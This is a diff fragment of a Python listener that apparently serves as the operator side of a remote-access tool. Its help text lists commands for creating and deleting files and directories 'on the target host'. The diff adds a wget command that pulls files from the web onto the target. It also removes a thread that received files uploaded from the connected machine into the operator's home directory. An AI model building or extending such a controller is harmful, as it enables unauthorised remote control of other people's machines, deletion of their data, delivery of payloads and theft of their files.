@@ -13,29 +13,13 @@ HELP = """
 4. mkdir [dir path]         Make a new dictionary.
 5. touch [file path]        Create a new File.
 6. rmdir [dir path]         Delete the dir on the target host.
-7. rmfile [file path]       Delete the file on the target host."""
+7. rmfile [file path]       Delete the file on the target host.
+8. wget [url]               Download a file from web on the target host."""
 
 print(" [INFO] WAIT FOR THE CLIENT CONNECT......")
 tcpserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 tcpserver.bind(("", int(sys.argv[1])))
 tcpserver.listen(1)
-
-def file_server():
-    file_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    file_server.bind(("",int(sys.argv[2])))
-    file_server.listen(1)
-    while True:
-        conn, addr = file_server.accept()
-        file_download = conn.makefile().read()
-        file = os.environ['HOME']+"/download_file_"+str(random.random())
-        with open(file,"w") as f:
-            f.write(file_download)
-        f.close()
-        print("Successful Download: "+file)
-
-
-file_server_thread = threading.Thread(target=file_server, name="file_server")
-file_server_thread.start()
 
 while True:
     conn, addr = tcpserver.accept()
